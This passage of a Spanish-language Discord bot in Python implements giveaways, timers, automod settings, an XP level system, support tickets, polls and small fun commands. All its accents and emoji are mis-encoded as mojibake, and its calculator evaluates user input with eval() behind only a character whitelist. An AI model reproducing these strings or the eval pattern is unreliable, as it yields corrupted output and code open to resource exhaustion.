                           button: discord.ui.Button):
        # Solo el autor original puede finalizar
        if interaction.user.id != active_giveaways.get(self.giveaway_id,
                                                       {}).get('author_id'):
            await interaction.response.send_message(
                "‚ùå Solo quien cre√≥ el sorteo puede finalizarlo.",
                ephemeral=True)
            return

        if len(self.participants) == 0:
            await interaction.response.send_message(
                "‚ùå No hay participantes en el sorteo.", ephemeral=True)
            return

        # Seleccionar ganadores
        participants_list = list(self.participants)
        winners_count = min(self.winners_count, len(participants_list))
        winners = random.sample(participants_list, winners_count)

        # Crear embed de resultados
        embed = discord.Embed(title="üéä ¬°SORTEO FINALIZADO!",
                              color=discord.Color.gold())

        giveaway_data = active_giveaways.get(self.giveaway_id, {})
        embed.add_field(name="üéÅ Premio",
                        value=giveaway_data.get('prize', 'No especificado'),
                        inline=False)

        winners_text = ""
        for i, winner_id in enumerate(winners):
            try:
                winner = bot.get_user(winner_id)
                if winner:
                    winners_text += f"{'ü•á' if i == 0 else 'üéâ'} {winner.mention}\n"
                else:
                    winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"
            except:
                winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"

        embed.add_field(name="üèÜ Ganadores", value=winners_text, inline=False)
        embed.add_field(
            name="üìä Estad√≠sticas",
            value=f"**{len(self.participants)}** participantes totales",
            inline=False)
        embed.set_footer(
            text=f"Sorteo finalizado por {interaction.user.display_name}")

        # Deshabilitar botones
        for item in self.children:
            item.disabled = True

        await interaction.response.edit_message(embed=embed, view=self)

        # Eliminar del registro
        if self.giveaway_id in active_giveaways:
            del active_giveaways[self.giveaway_id]


@bot.tree.command(name="gstart", description="Iniciar un sorteo interactivo")
@discord.app_commands.describe(
    duration="Duraci√≥n en minutos (opcional, por defecto sin l√≠mite)",
    winners="N√∫mero de ganadores",
    prize="Premio del sorteo")
async def gstart(interaction: discord.Interaction,
                 winners: int,
                 prize: str,
                 duration: int = 0):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if winners <= 0:
        await interaction.response.send_message(
            "‚ùå El n√∫mero de ganadores debe ser mayor a 0.", ephemeral=True)
        return

    if winners > 20:
        await interaction.response.send_message(
            "‚ùå El n√∫mero m√°ximo de ganadores es 20.", ephemeral=True)
        return

    # Generar ID √∫nico para el sorteo
    giveaway_id = f"{interaction.guild.id}_{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Guardar datos del sorteo
    active_giveaways[giveaway_id] = {
        'author_id': interaction.user.id,
        'prize': prize,
        'winners_count': winners,
        'channel_id': interaction.channel.id
    }

    # Crear embed del sorteo
    embed = discord.Embed(
        title="üéâ ¬°NUEVO SORTEO!",
        description=f"¬°Participa haciendo clic en el bot√≥n de abajo!",
        color=discord.Color.blue())

    embed.add_field(name="üéÅ Premio", value=prize, inline=True)
    embed.add_field(name="üèÜ Ganadores",
                    value=f"{winners} ganador{'es' if winners > 1 else ''}",
                    inline=True)
    embed.add_field(name="üë• Participantes",
                    value="**0** usuarios participando",
                    inline=True)

    if duration > 0:
        end_time = datetime.datetime.utcnow() + datetime.timedelta(
            minutes=duration)
        embed.add_field(name="‚è∞ Finaliza",
                        value=f"<t:{int(end_time.timestamp())}:R>",
                        inline=False)
    else:
        embed.add_field(name="‚è∞ Duraci√≥n",
                        value="Sin l√≠mite de tiempo (finalizar manualmente)",
                        inline=False)

    embed.set_footer(text=f"Sorteo creado por {interaction.user.display_name}",
                     icon_url=interaction.user.display_avatar.url)

    # Crear vista con botones
    view = GiveawayView(giveaway_id, winners)

    await interaction.response.send_message(embed=embed, view=view)

    # Si tiene duraci√≥n, programar finalizaci√≥n autom√°tica
    if duration > 0:
        await asyncio.sleep(duration * 60)

        # Verificar si el sorteo sigue activo
        if giveaway_id in active_giveaways:
            try:
                message = await interaction.original_response()

                if len(view.participants) == 0:
                    embed = discord.Embed(
                        title="‚è∞ Sorteo Terminado",
                        description="El sorteo ha terminado sin participantes.",
                        color=discord.Color.orange())
                    embed.add_field(name="üéÅ Premio", value=prize, inline=False)

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)
                else:
                    # Finalizar autom√°ticamente
                    participants_list = list(view.participants)
                    winners_count = min(winners, len(participants_list))
                    auto_winners = random.sample(participants_list,
                                                 winners_count)

                    embed = discord.Embed(
                        title="‚è∞ ¬°SORTEO TERMINADO AUTOM√ÅTICAMENTE!",
                        color=discord.Color.gold())

                    embed.add_field(name="üéÅ Premio", value=prize, inline=False)

                    winners_text = ""
                    for i, winner_id in enumerate(auto_winners):
                        try:
                            winner = bot.get_user(winner_id)
                            if winner:
                                winners_text += f"{'ü•á' if i == 0 else 'üéâ'} {winner.mention}\n"
                            else:
                                winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"
                        except:
                            winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"

                    embed.add_field(name="üèÜ Ganadores",
                                    value=winners_text,
                                    inline=False)
                    embed.add_field(
                        name="üìä Estad√≠sticas",
                        value=
                        f"**{len(view.participants)}** participantes totales",
                        inline=False)
                    embed.set_footer(
                        text="Sorteo finalizado autom√°ticamente por tiempo")

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)

                # Limpiar del registro
                if giveaway_id in active_giveaways:
                    del active_giveaways[giveaway_id]

            except Exception as e:
                print(f"Error al finalizar sorteo autom√°ticamente: {e}")


# Sistema de temporizadores
active_timers = {}


@bot.tree.command(name="timer", description="Establecer un temporizador")
@discord.app_commands.describe(duration="Duraci√≥n en minutos",
                               message="Mensaje personalizado (opcional)")
async def timer(interaction: discord.Interaction,
                duration: int,
                message: str = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if duration <= 0:
        await interaction.response.send_message(
            "‚ùå La duraci√≥n debe ser mayor a 0 minutos.", ephemeral=True)
        return

    if duration > 1440:  # 24 horas m√°ximo
        await interaction.response.send_message(
            "‚ùå La duraci√≥n m√°xima es de 1440 minutos (24 horas).",
            ephemeral=True)
        return

    # Crear ID √∫nico para el temporizador
    timer_id = f"{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Calcular tiempo de finalizaci√≥n
    end_time = datetime.datetime.utcnow() + datetime.timedelta(
        minutes=duration)

    # Guardar temporizador activo
    active_timers[timer_id] = {
        'user_id': interaction.user.id,
        'channel_id': interaction.channel.id,
        'message': message or "¬°Tu temporizador ha terminado!",
        'end_time': end_time
    }

    # Crear embed del temporizador
    embed = discord.Embed(title="‚è∞ Temporizador Establecido",
                          color=discord.Color.blue())

    embed.add_field(name="‚è±Ô∏è Duraci√≥n",
                    value=f"{duration} minutos",
                    inline=True)
    embed.add_field(name="üïê Finaliza",
                    value=f"<t:{int(end_time.timestamp())}:R>",
                    inline=True)
    embed.add_field(name="üí¨ Mensaje",
                    value=message or "¬°Tu temporizador ha terminado!",
                    inline=False)
    embed.set_footer(text=f"Temporizador de {interaction.user.display_name}",
                     icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)

    # Esperar el tiempo especificado
    await asyncio.sleep(duration * 60)

    # Verificar si el temporizador sigue activo
    if timer_id in active_timers:
        timer_data = active_timers[timer_id]

        try:
            # Crear embed de notificaci√≥n
            notification_embed = discord.Embed(
                title="‚è∞ ¬°TEMPORIZADOR TERMINADO!",
                description=timer_data['message'],
                color=discord.Color.green())
            notification_embed.add_field(name="‚è±Ô∏è Duraci√≥n",
                                         value=f"{duration} minutos",
                                         inline=True)
            notification_embed.set_footer(text="Tu temporizador ha expirado")

            # Mencionar al usuario
            channel = bot.get_channel(timer_data['channel_id'])
            if channel:
                user = bot.get_user(timer_data['user_id'])
                user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
                await channel.send(f"‚è∞ {user_mention}",
                                   embed=notification_embed)

            # Limpiar del registro
            del active_timers[timer_id]

        except Exception as e:
            print(f"Error al enviar notificaci√≥n de temporizador: {e}")
            # Limpiar del registro incluso si hay error
            if timer_id in active_timers:
                del active_timers[timer_id]


# ================================
# SISTEMA DE MODERACI√ìN AUTOM√ÅTICA
# ================================

# Configuraci√≥n de automod
automod_enabled = {}
automod_settings = {}
warning_counts = {}


@bot.tree.command(name="automod",
                  description="Configurar sistema de moderaci√≥n autom√°tica")
@discord.app_commands.describe(
    enable="Activar o desactivar automod",
    spam_limit="L√≠mite de mensajes por minuto antes de tomar acci√≥n",
    warn_threshold="N√∫mero de advertencias antes de aplicar castigo")
async def automod_setup(interaction: discord.Interaction,
                        enable: bool,
                        spam_limit: int = 10,
                        warn_threshold: int = 3):
    if not interaction.user.guild_permissions.manage_guild:
        await interaction.response.send_message(
            "‚ùå Necesitas permisos de **Administrar Servidor**.",
            ephemeral=True)
        return

    guild_id = interaction.guild.id
    automod_enabled[guild_id] = enable
    automod_settings[guild_id] = {
        'spam_limit': spam_limit,
        'warn_threshold': warn_threshold
    }

    embed = discord.Embed(
        title="üõ°Ô∏è Sistema de Moderaci√≥n Autom√°tica",
        description=
        f"**Estado:** {'‚úÖ Activado' if enable else '‚ùå Desactivado'}",
        color=discord.Color.green() if enable else discord.Color.red())

    if enable:
        embed.add_field(
            name="üìä Configuraci√≥n",
            value=
            f"‚Ä¢ L√≠mite de spam: {spam_limit} msg/min\n‚Ä¢ Advertencias m√°ximas: {warn_threshold}",
            inline=False)

    await interaction.response.send_message(embed=embed)


# Filtro de palabras prohibidas
banned_words = [
    # Palabras ofensivas b√°sicas
    "idiota",
    "estupido",
    "imbecil",
    "tonto",
    "burro",
    # Insultos m√°s fuertes (censurados)
    "m*****",
    "c*****",
    "p****",
    "h***",
    "z****"
]


# Sistema de niveles/experiencia
levels_file = 'levels.json'
if os.path.exists(levels_file):
    with open(levels_file, 'r') as f:
        user_levels = json.load(f)
else:
    user_levels = {}


def save_levels():
    with open(levels_file, 'w') as f:
        json.dump(user_levels, f)


def get_user_level_data(user_id):
    user_id = str(user_id)
    if user_id not in user_levels:
        user_levels[user_id] = {"xp": 0, "level": 1, "messages": 0}
    return user_levels[user_id]


def add_xp(user_id, xp_amount):
    user_id = str(user_id)
    data = get_user_level_data(user_id)
    data["xp"] += xp_amount
    data["messages"] += 1

    # Calcular nuevo nivel
    xp_needed = data["level"] * 100
    if data["xp"] >= xp_needed:
        data["level"] += 1
        data["xp"] = data["xp"] - xp_needed
        save_levels()
        return True  # Subi√≥ de nivel

    save_levels()
    return False  # No subi√≥ de nivel


# Funci√≥n auxiliar para sistema de niveles (sin decorador @bot.event)
async def process_level_system(message):
    if message.author.bot:
        return

    # Sistema de niveles (XP por mensaje)
    xp_gained = random.randint(5, 15)
    leveled_up = add_xp(message.author.id, xp_gained)

    if leveled_up:
        data = get_user_level_data(message.author.id)
        embed = discord.Embed(
            title="üéâ ¬°Subiste de Nivel!",
            description=
            f"{message.author.mention} alcanz√≥ el **Nivel {data['level']}**!",
            color=discord.Color.gold())
        await message.channel.send(embed=embed, delete_after=10)


@bot.tree.command(name="level", description="Ver tu nivel y experiencia")
@discord.app_commands.describe(user="Usuario del que ver el nivel (opcional)")
async def check_level(interaction: discord.Interaction,
                      user: discord.Member = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    target = user or interaction.user
    data = get_user_level_data(target.id)

    xp_needed = data["level"] * 100
    progress = (data["xp"] / xp_needed) * 100

    embed = discord.Embed(title=f"üìä Nivel de {target.display_name}",
                          color=target.color if target.color
                          != discord.Color.default() else discord.Color.blue())
    embed.set_thumbnail(url=target.display_avatar.url)

    embed.add_field(name="üèÜ Nivel", value=data["level"], inline=True)
    embed.add_field(name="‚≠ê XP",
                    value=f"{data['xp']}/{xp_needed}",
                    inline=True)
    embed.add_field(name="üí¨ Mensajes", value=data["messages"], inline=True)
    embed.add_field(name="üìà Progreso", value=f"{progress:.1f}%", inline=False)

    # Barra de progreso visual
    filled = int(progress // 10)
    bar = "‚ñà" * filled + "‚ñë" * (10 - filled)
    embed.add_field(name="üìä Barra de Progreso", value=f"`{bar}`", inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="leaderboard_levels",
                  description="Ver ranking de niveles del servidor")
async def level_leaderboard(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Crear lista de usuarios con sus niveles
    user_list = []
    for user_id, data in user_levels.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total_xp = (data["level"] - 1) * 100 + data["xp"]
                user_list.append((user.display_name, data["level"], total_xp,
                                  data["messages"]))
        except:
            continue

    # Ordenar por nivel y luego por XP total
    user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
    user_list = user_list[:10]  # Top 10

    embed = discord.Embed(title="üèÜ Ranking de Niveles",
                          color=discord.Color.gold())

    if not user_list:
        embed.description = "No hay datos de niveles disponibles."
    else:
        description = ""
        medals = ["ü•á", "ü•à", "ü•â"]
        for i, (name, level, total_xp, messages) in enumerate(user_list):
            medal = medals[i] if i < 3 else f"{i+1}."
            description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
        embed.description = description

    await interaction.response.send_message(embed=embed)


# ================================
# SISTEMA DE TICKETS DE SOPORTE
# ================================

active_tickets = {}


class TicketView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='üé´ Crear Ticket',
                       style=discord.ButtonStyle.green,
                       custom_id='create_ticket')
    async def create_ticket(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        # Verificar si ya tiene un ticket abierto
        existing_ticket = None
        for channel in guild.channels:
            if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
                existing_ticket = channel
                break

        if existing_ticket:
            await interaction.response.send_message(
                f"‚ùå Ya tienes un ticket abierto: {existing_ticket.mention}",
                ephemeral=True)
            return

        # Crear canal de ticket
        try:
            overwrites = {
                guild.default_role:
                discord.PermissionOverwrite(read_messages=False),
                user:
                discord.PermissionOverwrite(read_messages=True,
                                            send_messages=True),
                guild.me:
                discord.PermissionOverwrite(read_messages=True,
                                            send_messages=True)
            }

            # Buscar rol de moderador o admin
            mod_role = None
            for role in guild.roles:
                if any(name in role.name.lower()
                       for name in ['mod', 'admin', 'staff', 'soporte']):
                    mod_role = role
                    overwrites[role] = discord.PermissionOverwrite(
                        read_messages=True, send_messages=True)
                    break

            ticket_channel = await guild.create_text_channel(
                f"ticket-{user.id}",
                overwrites=overwrites,
                category=None,
                reason=f"Ticket de soporte creado por {user.name}")

            # Mensaje inicial del ticket
            embed = discord.Embed(
                title="üé´ Ticket de Soporte Creado",
                description=f"Hola {user.mention}! Tu ticket ha sido creado.\n\n"
                f"üìù **Describe tu problema** y el equipo de soporte te ayudar√° pronto.\n"
                f"üîí Para cerrar este ticket, usa el bot√≥n de abajo.",
                color=discord.Color.blue())
            embed.set_footer(text=f"Ticket ID: {user.id}")

            close_view = CloseTicketView()
            await ticket_channel.send(embed=embed, view=close_view)

            # Mensaje de confirmaci√≥n
            await interaction.response.send_message(
                f"‚úÖ Tu ticket ha sido creado: {ticket_channel.mention}",
                ephemeral=True)

            # Guardar ticket activo
            active_tickets[user.id] = ticket_channel.id

        except Exception as e:
            await interaction.response.send_message(
                f"‚ùå Error al crear el ticket: {str(e)}", ephemeral=True)


class CloseTicketView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='üîí Cerrar Ticket',
                       style=discord.ButtonStyle.red,
                       custom_id='close_ticket')
    async def close_ticket(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        channel = interaction.channel

        # Confirmar cierre
        embed = discord.Embed(
            title="‚ö†Ô∏è Confirmar Cierre",
            description=
            "¬øEst√°s seguro de que quieres cerrar este ticket?\n\n**Esta acci√≥n no se puede deshacer.**",
            color=discord.Color.orange())

        confirm_view = ConfirmCloseView()
        await interaction.response.send_message(embed=embed,
                                                view=confirm_view,
                                                ephemeral=True)


class ConfirmCloseView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=60)

    @discord.ui.button(label='‚úÖ S√≠, cerrar',
                       style=discord.ButtonStyle.red,
                       custom_id='confirm_close')
    async def confirm_close(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        channel = interaction.channel

        try:
            # Remover de tickets activos
            user_id = None
            for uid, cid in active_tickets.items():
                if cid == channel.id:
                    user_id = uid
                    break

            if user_id:
                del active_tickets[user_id]

            await interaction.response.send_message(
                "üîí **Cerrando ticket...** Este canal se eliminar√° en 5 segundos.",
                ephemeral=False)
            await asyncio.sleep(5)
            await channel.delete(reason="Ticket cerrado")

        except Exception as e:
            await interaction.response.send_message(
                f"‚ùå Error al cerrar el ticket: {str(e)}", ephemeral=True)

    @discord.ui.button(label='‚ùå Cancelar',
                       style=discord.ButtonStyle.gray,
                       custom_id='cancel_close')
    async def cancel_close(self, interaction: discord.Interaction,
                           button: discord.ui.Button):
        await interaction.response.send_message(
            "‚úÖ Cierre cancelado. El ticket permanece abierto.", ephemeral=True)


@bot.tree.command(
    name="ticket_setup",
    description="Configurar sistema de tickets en el canal actual")
async def setup_tickets(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "‚ùå Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    embed = discord.Embed(
        title="üé´ Sistema de Tickets de Soporte",
        description=
        "**¬øNecesitas ayuda?** Crea un ticket de soporte haciendo clic en el bot√≥n de abajo.\n\n"
        "üîπ **¬øPara qu√© usar los tickets?**\n"
        "‚Ä¢ Reportar problemas\n"
        "‚Ä¢ Solicitar ayuda\n"
        "‚Ä¢ Consultas privadas\n"
        "‚Ä¢ Sugerencias\n\n"
        "‚è±Ô∏è **Tiempo de respuesta promedio:** 1-24 horas",
        color=discord.Color.blue())
    embed.set_footer(text="Haz clic en 'Crear Ticket' para empezar")

    view = TicketView()
    await interaction.response.send_message(embed=embed, view=view)


# ================================
# COMANDOS ADICIONALES DE UTILIDAD
# ================================


@bot.tree.command(name="clear", description="Eliminar mensajes del canal")
@discord.app_commands.describe(amount="N√∫mero de mensajes a eliminar (1-100)")
async def clear_messages(interaction: discord.Interaction, amount: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message(
            "‚ùå Necesitas permisos de **Administrar Mensajes**.",
            ephemeral=True)
        return

    if amount < 1 or amount > 100:
        await interaction.response.send_message(
            "‚ùå Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
        return

    await interaction.response.defer()

    try:
        deleted = await interaction.channel.purge(limit=amount)
        embed = discord.Embed(
            title="üóëÔ∏è Mensajes Eliminados",
            description=f"Se eliminaron **{len(deleted)}** mensajes.",
            color=discord.Color.green())
        await interaction.followup.send(embed=embed, delete_after=10)
    except Exception as e:
        await interaction.followup.send(
            f"‚ùå Error al eliminar mensajes: {str(e)}", ephemeral=True)


@bot.tree.command(name="userinfo", description="Ver informaci√≥n de un usuario")
@discord.app_commands.describe(user="Usuario del que ver la informaci√≥n")
async def user_info(interaction: discord.Interaction,
                    user: discord.Member = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    target = user or interaction.user

    embed = discord.Embed(title=f"üë§ Informaci√≥n de {target.display_name}",
                          color=target.color if target.color
                          != discord.Color.default() else discord.Color.blue())
    embed.set_thumbnail(url=target.display_avatar.url)

    # Informaci√≥n b√°sica
    embed.add_field(name="üìõ Nombre",
                    value=f"{target.name}#{target.discriminator}",
                    inline=True)
    embed.add_field(name="üÜî ID", value=target.id, inline=True)
    embed.add_field(name="ü§ñ Bot",
                    value="‚úÖ" if target.bot else "‚ùå",
                    inline=True)

    # Fechas
    embed.add_field(name="üìÖ Cuenta creada",
                    value=f"<t:{int(target.created_at.timestamp())}:R>",
                    inline=True)
    embed.add_field(name="üì• Se uni√≥ al servidor",
                    value=f"<t:{int(target.joined_at.timestamp())}:R>",
                    inline=True)

    # Roles
    roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
    embed.add_field(name=f"üè∑Ô∏è Roles ({len(roles)})",
                    value=" ".join(roles[:5]) +
                    (f" y {len(roles)-5} m√°s..." if len(roles) > 5 else "")
                    if roles else "Ninguno",
                    inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="poll", description="Crear una encuesta")
@discord.app_commands.describe(question="Pregunta de la encuesta",
                               option1="Primera opci√≥n",
                               option2="Segunda opci√≥n",
                               option3="Tercera opci√≥n (opcional)",
                               option4="Cuarta opci√≥n (opcional)")
async def create_poll(interaction: discord.Interaction,
                      question: str,
                      option1: str,
                      option2: str,
                      option3: str = None,
                      option4: str = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    options = [option1, option2]
    if option3: options.append(option3)
    if option4: options.append(option4)

    embed = discord.Embed(title="üìä Encuesta",
                          description=f"**{question}**",
                          color=discord.Color.blue())

    reactions = ['1Ô∏è‚É£', '2Ô∏è‚É£', '3Ô∏è‚É£', '4Ô∏è‚É£']
    description = ""
    for i, option in enumerate(options):
        description += f"\n{reactions[i]} {option}"

    embed.add_field(name="Opciones:", value=description, inline=False)
    embed.set_footer(
        text=f"Encuesta creada por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed)
    message = await interaction.original_response()

    # A√±adir reacciones
    for i in range(len(options)):
        await message.add_reaction(reactions[i])


# ================================
# COMANDOS DE DIVERSI√ìN ADICIONALES
# ================================


@bot.tree.command(name="meme", description="Obtener un meme aleatorio")
async def get_meme(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    memes = [
        "https://i.imgur.com/XyLOD.jpg", "https://i.imgur.com/fPUUf.jpg",
        "https://i.imgur.com/dQaJk.jpg"
    ]

    embed = discord.Embed(title="üòÇ Meme Aleatorio",
                          color=discord.Color.random())
    embed.set_image(url=random.choice(memes))

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="8ball", description="Pregunta a la bola m√°gica")
@discord.app_commands.describe(question="Tu pregunta")
async def eight_ball(interaction: discord.Interaction, question: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    responses = [
        "üé± Es cierto.", "üé± Es decididamente as√≠.", "üé± Sin duda.",
        "üé± S√≠, definitivamente.", "üé± Puedes confiar en ello.",
        "üé± Como yo lo veo, s√≠.", "üé± Muy probable.",
        "üé± Las perspectivas son buenas.", "üé± S√≠.",
        "üé± Las se√±ales apuntan a que s√≠.",
        "üé± Respuesta confusa, intenta de nuevo.",
        "üé± Pregunta de nuevo m√°s tarde.", "üé± Mejor no te lo digo ahora.",
        "üé± No puedo predecirlo ahora.", "üé± Conc√©ntrate y pregunta de nuevo.",
        "üé± No cuentes con ello.", "üé± Mi respuesta es no.",
        "üé± Mis fuentes dicen que no.", "üé± Las perspectivas no son tan buenas.",
        "üé± Muy dudoso."
    ]

    embed = discord.Embed(
        title="üé± Bola M√°gica",
        description=f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
        color=discord.Color.purple())

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================

@bot.tree.command(name="avatar", description="Ver el avatar de un usuario")
@discord.app_commands.describe(user="Usuario del que ver el avatar")
async def avatar_command(interaction: discord.Interaction, user: discord.Member = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    target = user or interaction.user

    embed = discord.Embed(
        title=f"üñºÔ∏è Avatar de {target.display_name}",
        color=target.color if target.color != discord.Color.default() else discord.Color.blue())

    embed.set_image(url=target.display_avatar.url)
    embed.add_field(name="üîó Enlace directo", 
                   value=f"[Descargar]({target.display_avatar.url})", 
                   inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="math", description="Calculadora b√°sica")
@discord.app_commands.describe(expression="Expresi√≥n matem√°tica (ej: 2+2, 10*5, sqrt(16))")
async def math_command(interaction: discord.Interaction, expression: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    try:
        # Reemplazar funciones comunes
        expression = expression.replace("sqrt", "**0.5")
        expression = expression.replace("^", "**")

        # Evaluaci√≥n segura solo con operadores matem√°ticos b√°sicos
        allowed_chars = "0123456789+-*/.() "
        if all(c in allowed_chars for c in expression):
            result = eval(expression)

            embed = discord.Embed(
                title="üî¢ Calculadora",
                color=discord.Color.green())
            embed.add_field(name="üìù Expresi√≥n", value=f"`{expression}`", inline=False)
            embed.add_field(name="‚úÖ Resultado", value=f"`{result}`", inline=False)

            await interaction.response.send_message(embed=embed)
        else:
            await interaction.response.send_message(
                "‚ùå Solo se permiten n√∫meros y operadores matem√°ticos b√°sicos (+, -, *, /, (), sqrt)",
                ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(
            f"‚ùå Error en la expresi√≥n matem√°tica: {str(e)}", ephemeral=True)


@bot.tree.command(name="weather", description="Informaci√≥n meteorol√≥gica simulada")
@discord.app_commands.describe(city="Ciudad (simulaci√≥n)")
async def weather_command(interaction: discord.Interaction, city: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Simulaci√≥n de datos meteorol√≥gicos
    temperatures = list(range(-5, 35))
    conditions = ["‚òÄÔ∏è Soleado", "‚õÖ Parcialmente nublado", "‚òÅÔ∏è Nublado", 
                 "üåßÔ∏è Lluvioso", "‚õàÔ∏è Tormentoso", "üå®Ô∏è Nevando"]

    temp = random.choice(temperatures)
    condition = random.choice(conditions)
    humidity = random.randint(30, 90)
    wind_speed = random.randint(5, 25)

    embed = discord.Embed(
        title=f"üå§Ô∏è Clima en {city.title()}",
        description=f"**{condition}**",
        color=discord.Color.blue())

    embed.add_field(name="üå°Ô∏è Temperatura", value=f"{temp}¬∞C", inline=True)
    embed.add_field(name="üí® Viento", value=f"{wind_speed} km/h", inline=True)
    embed.add_field(name="üíß Humedad", value=f"{humidity}%", inline=True)
    embed.set_footer(text="‚ö†Ô∏è Datos simulados - No reales")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="reminder", description="Crear un recordatorio")
@discord.app_commands.describe(time="Tiempo en minutos", message="Mensaje del recordatorio")
async def reminder_command(interaction: discord.Interaction, time: int, message: str):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if time <= 0 or time > 1440:  # M√°ximo 24 horas
        await interaction.response.send_message(
            "‚ùå El tiempo debe ser entre 1 minuto y 1440 minutos (24 horas).",
            ephemeral=True)
        return

    end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=time)

    embed = discord.Embed(
        title="‚è∞ Recordatorio Establecido",
        description=f"Te recordar√© en **{time} minutos**",
        color=discord.Color.blue())
    embed.add_field(name="üìù Mensaje", value=message, inline=False)
    embed.add_field(name="üïê Te recordar√©", value=f"<t:{int(end_time.timestamp())}:R>", inline=False)

    await interaction.response.send_message(embed=embed)

    # Esperar y enviar recordatorio
    await asyncio.sleep(time * 60)

    try:
        reminder_embed = discord.Embed(
            title="üîî ¬°RECORDATORIO!",
            description=message,
            color=discord.Color.orange())
        reminder_embed.set_footer(text=f"Recordatorio de hace {time} minutos")

        await interaction.followup.send(f"‚è∞ {interaction.user.mention}", embed=reminder_embed)
    except:
        pass


@bot.tree.command(name="flip", description="Lanzar una moneda")
async def flip_command(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    result = random.choice(["ü™ô Cara", "üîÑ Cruz"])

    embed = discord.Embed(
        title="ü™ô Lanzamiento de Moneda",
        description=f"**Resultado: {result}**",
        color=discord.Color.gold())

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="dice", description="Lanzar dados")
@discord.app_commands.describe(sides="N√∫mero de caras del dado (por defecto 6)", count="Cantidad de dados (por defecto 1)")
async def dice_command(interaction: discord.Interaction, sides: int = 6, count: int = 1):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if sides < 2 or sides > 100:
        await interaction.response.send_message(
            "‚ùå El dado debe tener entre 2 y 100 caras.", ephemeral=True)
        return

    if count < 1 or count > 10:
        await interaction.response.send_message(
            "‚ùå Puedes lanzar entre 1 y 10 dados.", ephemeral=True)
        return

    results = [random.randint(1, sides) for _ in range(count)]
    total = sum(results)

    embed = discord.Embed(
        title=f"üé≤ Lanzamiento de Dados (d{sides})",
        color=discord.Color.red())

    embed.add_field(name="üéØ Resultados", 
                   value=" | ".join([f"**{r}**" for r in results]), 
                   inline=False)
    embed.add_field(name="üìä Total", value=f"**{total}**", inline=True)
    embed.add_field(name="üìà Promedio", value=f"**{total/count:.1f}**", inline=True)

    await interaction.response.send_message(embed=embed)


